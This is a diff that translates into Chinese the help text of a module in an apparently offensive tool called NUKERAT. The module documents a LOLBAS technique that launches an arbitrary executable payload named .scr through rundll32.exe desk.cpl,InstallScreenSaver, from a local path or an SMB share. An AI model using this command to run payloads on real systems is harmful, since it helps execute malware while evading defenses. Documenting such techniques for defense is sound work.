@@ -1,18 +1,18 @@
-ABOUT
+关于
     Desktop Settings Control Panel. LOLBAS documents launch any
     executable payload, as long as it uses the .scr extension.
 
-USAGE:
+用法：
     rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
     rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
 
-EXAMPLES:
+示例：
     rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
     rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
